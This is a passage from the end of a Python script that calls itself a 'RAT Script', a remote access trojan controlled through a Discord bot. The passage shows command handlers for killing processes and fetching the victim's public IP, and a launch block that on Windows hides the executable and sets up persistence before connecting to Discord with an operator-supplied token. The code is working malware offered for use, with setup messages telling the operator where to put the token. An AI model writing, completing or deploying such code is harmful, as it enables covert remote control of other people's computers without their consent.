                 await send_error(message.channel, f"Usage: `{PREFIX}kill [PID_or_Process_Name]`")
             else:
                 success, result = terminate_process(args_str)
                 # Use info because result contains success/error details already
                 await send_info(message.channel, result)

        elif command == 'getip':
            success, result = get_public_ip_address()
            if success: await send_success(message.channel, result)
            else: await send_error(message.channel, result)


        # Optional: Handle unknown commands
        # else:
        #     await send_error(message.channel, f"Unknown command: `{command}`. Use `{PREFIX}help` for available commands.")


    except discord.errors.Forbidden:
        log.error(f"Permission error processing command '{command}' in channel {message.channel.id}.")
        # Cannot send error message back if we lack send permissions.
    except Exception as e:
        log.exception(f"Unexpected error handling command '{command}' in channel {message.channel.id}.")
        try:
            # Attempt to notify user about the failure
            await send_error(message.channel, f"A critical error occurred while processing command `{command}`:\n```\n{e}\n```")
        except Exception as inner_e:
            log.error(f"Further error sending critical error notification: {inner_e}")


# --- Main Execution Block ---
if __name__ == '__main__':
    log.info("--- RAT Script Initializing ---")

    # Perform platform-specific setup (Windows only)
    if platform.system() == "Windows":
        log.info("Windows detected. Attempting stealth and persistence setup.")
        hide_current_executable()
        ensure_persistence() # Uses default filename
    else:
        log.info("Non-Windows platform detected. Skipping stealth and persistence.")

    # Validate Token
    if not TOKEN or len(TOKEN) < 50: # Basic sanity check
         log.critical("FATAL: Discord Bot Token is missing or appears invalid in the script.")
         print("\n" + "="*50)
         print("   !!! CONFIGURATION ERROR !!!")
         print("   Discord Bot Token is not set or looks invalid.")
         print(f"   Please edit the 'TOKEN' variable in the script ({os.path.basename(__file__)})")
         print("   with your actual bot token.")
         print("="*50 + "\n")
         sys.exit(1) # Exit if token is invalid/missing
    elif TOKEN == 'ENTER_TOKEN_HERE':
        log.warning("Using the default placeholder TOKEN. This will not work!")
        print("\n" + "="*50)
        print("   !!! WARNING !!!")
        print("   You are using the default placeholder bot token.")
        print("   The bot will not connect to Discord.")
        print(f"   Please edit the 'TOKEN' variable in the script ({os.path.basename(__file__)})")
        print("   with your actual bot token.")
        print("="*50 + "\n")
        # Don't exit immediately, allow testing other parts? Or maybe exit is better? Let's exit.
        sys.exit(1)

    # Start the bot
    log.info(f"Connecting to Discord using token ending with '...{TOKEN[-6:]}'")
    try:
        client.run(TOKEN, log_handler=None) # Disable default discord.py logging if using custom
    except discord.errors.LoginFailure:
        log.critical("Discord login failed: Invalid Token.")
        print("\n[FATAL ERROR] Could not log in to Discord. The provided TOKEN is invalid.")
    except discord.errors.PrivilegedIntentsRequired:
        log.critical("Discord Privileged Intents (Message Content) are required but not enabled.")
        print("\n[FATAL ERROR] Missing Privileged Intents!")
        print("The 'Message Content Intent' is required for this bot to read commands.")
        print("Please enable it in your bot's settings on the Discord Developer Portal.")
        print("https://discord.com/developers/applications")
    except Exception as e:
        log.critical(f"Unhandled exception during bot execution: {e}", exc_info=True)
        print(f"\n[CRITICAL ERROR] Bot stopped due to an unexpected error: {e}")

    log.info("--- RAT Script Terminated ---")
